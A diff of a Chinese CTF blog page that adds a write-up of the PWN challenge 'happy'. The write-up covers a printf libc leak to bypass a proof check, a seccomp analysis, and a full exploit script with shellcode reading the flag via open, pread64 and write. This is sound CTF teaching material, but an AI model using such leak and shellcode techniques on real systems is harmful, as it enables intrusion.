@@ -396,14 +396,14 @@ impor">
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    765
+                    1.2k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    4 分
+                    6 分
                 </div>
                 
 
@@ -622,6 +622,116 @@ i <span class="token operator">=</span> <span class="token number">0</span>
 <h3 id="FunnyEncrypt"><a href="#FunnyEncrypt" class="headerlink" title="FunnyEncrypt"></a>FunnyEncrypt</h3><p><img src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308300039451.png" alt="image-20230830002659009"></p>
 <p>本来想看看能不能词频分析的，结果发现完全对不到</p>
 <p>只好根据已知的nssctf和前面的一堆话里面寻找符合预感的字符与字母对应关系  ， 慢慢对应着可以找到的</p>
+<h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="happy"><a href="#happy" class="headerlink" title="happy"></a>happy</h3><p><img src="https://gitee.com/lmarch2/images/raw/master/Typora/202402042319627.png"></p>
+<p>主函数首先绕过proof，接着fork一个子进程，在父进程中进行一个有沙箱限制的shellcode执行</p>
+<blockquote>
+<p>这个地方在调试的时候可能容易卡住，需要用set follow-fork-mode parent停留在父进程继续调试</p>
+</blockquote>
+<p>首先我们来看proof函数</p>
+<p><img src="https://gitee.com/lmarch2/images/raw/master/Typora/202402042339598.png" alt="image-20240204233943567"></p>
+<p>要想让v4=v3，那么只能通过printf看看可不可以把一些信息泄露出来，然后再通过计算得到puts的地址</p>
+<p>通过调试能够发现，printf可以把栈上的数据打印出来，这里选择泄露出_IO_2_1_stderr_的libc地址</p>
+<p>计算得到puts的真实地址，绕过proof检测</p>
+<blockquote>
+<p>这里一定注意scanf函数的一些特性，特别是涉及到\n，+-号函数是会部分忽略还是完全忽略还是正常调用十分关键，这可以帮助节约大量调试的时间</p>
+<p>参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_54218833/article/details/121308367">https://blog.csdn.net/qq_54218833/article/details/121308367</a></p>
+</blockquote>
+<p>接下来就是shellcode的编写了</p>
+<pre class=" language-c"><code class="language-c">__int64 <span class="token function">sandbox</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token punctuation">{</span>
+  __int64 v1<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+8h] [rbp-8h]</span>
+
+  v1 <span class="token operator">=</span> <span class="token function">seccomp_init</span><span class="token punctuation">(</span><span class="token number">2147418112LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">seccomp_rule_add</span><span class="token punctuation">(</span>v1<span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">seccomp_rule_add</span><span class="token punctuation">(</span>v1<span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">42LL</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">seccomp_rule_add</span><span class="token punctuation">(</span>v1<span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">57LL</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">seccomp_rule_add</span><span class="token punctuation">(</span>v1<span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">322LL</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">return</span> <span class="token function">seccomp_load</span><span class="token punctuation">(</span>v1<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+</code></pre>
+<p>可以看出来禁用了read，connect，execve 调用</p>
+<p>这里用open，pread64，write绕过</p>
+<p>写exp</p>
+<pre class=" language-python"><code class="language-python"> <span class="token keyword">from</span> Excalibur <span class="token keyword">import</span><span class="token operator">*</span>
+
+contextset<span class="token punctuation">(</span><span class="token punctuation">)</span>
+proc<span class="token punctuation">(</span><span class="token string">'./pwn'</span><span class="token punctuation">)</span>
+
+<span class="token comment" spellcheck="true">#debug('b *0x4013FA\nb *0x401514\n')</span>
+<span class="token comment" spellcheck="true">#debug('b *0x40142E\nb *0x401490\n')</span>
+<span class="token comment" spellcheck="true">#debug('b *0x401508\n')</span>
+debug<span class="token punctuation">(</span><span class="token string">'b *0x401563\n'</span><span class="token punctuation">)</span>
+
+
+el<span class="token punctuation">(</span><span class="token string">'./pwn'</span><span class="token punctuation">)</span>
+lib<span class="token punctuation">(</span><span class="token string">'./libc.so.6'</span><span class="token punctuation">)</span>
+
+
+puts_got <span class="token operator">=</span> got<span class="token punctuation">(</span><span class="token string">'puts'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#0x403FF0</span>
+stderr <span class="token operator">=</span> libcsym<span class="token punctuation">(</span><span class="token string">'_IO_2_1_stderr_'</span><span class="token punctuation">)</span>
+puts <span class="token operator">=</span> libcsym<span class="token punctuation">(</span><span class="token string">'puts'</span><span class="token punctuation">)</span>
+
+
+sla<span class="token punctuation">(</span>b<span class="token string">'konw'</span><span class="token punctuation">,</span>b<span class="token string">'16'</span><span class="token punctuation">)</span>
+
+<span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    sl<span class="token punctuation">(</span>b<span class="token string">'+'</span><span class="token punctuation">)</span>
+
+<span class="token comment" spellcheck="true">#sl(b'a')</span>
+
+
+ru<span class="token punctuation">(</span>b<span class="token string">'0'</span><span class="token punctuation">)</span>
+std <span class="token operator">=</span> int<span class="token punctuation">(</span>rec<span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+prh<span class="token punctuation">(</span>std<span class="token punctuation">)</span>
+
+libcbase <span class="token operator">=</span> std <span class="token operator">-</span> stderr
+
+puts <span class="token operator">=</span> libcbase<span class="token operator">+</span>puts
+prh<span class="token punctuation">(</span>puts<span class="token punctuation">)</span>
+pr<span class="token punctuation">(</span>str<span class="token punctuation">(</span>puts<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+sda<span class="token punctuation">(</span>b<span class="token string">'try'</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>puts<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+
+bss <span class="token operator">=</span> <span class="token number">0x4040A0</span>
+shellcode <span class="token operator">=</span><span class="token triple-quoted-string string">'''
+nop
+nop
+push 0x67616c66
+mov rdi, rsp
+xor rdx, rdx
+xor rsi, rsi
+push 0x2
+pop rax
+syscall
+'''</span>
+<span class="token comment" spellcheck="true">#shellcraft.open("flag")</span>
+shellcode <span class="token operator">+=</span> <span class="token triple-quoted-string string">'''
+push 0x11
+pop rax
+push 0x4041A0
+pop rsi
+push 0x3
+pop rdi
+push 0x64
+pop rdx
+push 0x0
+pop r10
+syscall
+'''</span>
+shellcode <span class="token operator">+=</span> shellcraft<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>bss <span class="token operator">+</span> <span class="token number">0x100</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span>
+
+shellcode <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span>
+
+<span class="token keyword">print</span><span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>len<span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+sl<span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span>
+
+
+
+ia<span class="token punctuation">(</span><span class="token punctuation">)</span>
+</code></pre>
 
                 
             </div>
@@ -1272,7 +1382,7 @@ i <span class="token operator">=</span> <span class="token number">0</span>
             <br>
             
                 &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                        class="white-color">30.7k</span>
+                        class="white-color">31.1k</span>
             
             
             
